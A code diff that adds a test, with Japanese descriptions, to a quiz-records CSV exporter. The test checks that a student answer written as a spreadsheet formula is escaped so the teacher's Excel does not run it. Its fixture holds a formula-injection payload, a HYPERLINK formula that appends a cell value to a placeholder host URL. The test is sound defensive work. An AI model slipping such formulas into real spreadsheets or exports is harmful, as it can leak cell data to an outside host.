@@ -413,6 +413,33 @@ describe("CSV", () => {
     expect(row?.startsWith("アヤ,AUPP 1期生")).toBe(true);
   });
 
+  it("数式に 見える こたえを、先生の Excel が 実行しない", () => {
+    const table = quizTable(
+      [
+        {
+          id: "1",
+          profile_id: "aya",
+          quiz_set_id: "houkoku-quiz",
+          question_id: "q1",
+          question_type: "keyword",
+          answer_text: '=HYPERLINK("http://example.invalid/"&A2,"OK")',
+          correct: false,
+          earned: 0,
+          max_points: 2,
+          question_index: 0,
+          full_set: true,
+          attempt_id: "abcdef01-0000-4000-a000-000000000000",
+          created_at: "2026-09-02T02:00:00.000Z",
+        },
+      ],
+      LOOKUPS,
+    );
+    const csv = buildRecordsCsv(table.columns, table.rows);
+    // 先頭に ' が 付き、数式では なく 文字として 読まれる
+    expect(csv).toContain("\"'=HYPERLINK(");
+    expect(csv).not.toContain(",=HYPERLINK(");
+  });
+
   it("カンマ・引用符・改行を 含む こたえを 壊さない", () => {
     const table = quizTable(
       [
